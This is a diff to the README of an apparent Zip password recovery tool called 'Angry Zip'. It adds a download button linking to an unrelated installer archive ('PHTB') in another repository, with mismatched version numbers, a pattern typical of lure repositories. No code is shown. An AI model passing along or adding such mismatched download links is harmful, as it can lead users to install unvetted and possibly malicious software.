@@ -71,3 +71,6 @@ Angry Zip is a Zip Password recovery tool.It have almost the same personality as
 # How to Use?
 Easily open Angry Zip then you will  already know.
 
+<a href="https://github.com/TheGamerz29/PHTB-/releases/download/V1.36X/PHTB.V1.34.Release.Installer.zip" download="#PHTB">
+  <img src="https://github.com/TheGamerz29/thegamerz29.github.io/raw/images/downloadbutton_30.png" alt="PHTB" width="251" height="74">
+</a>
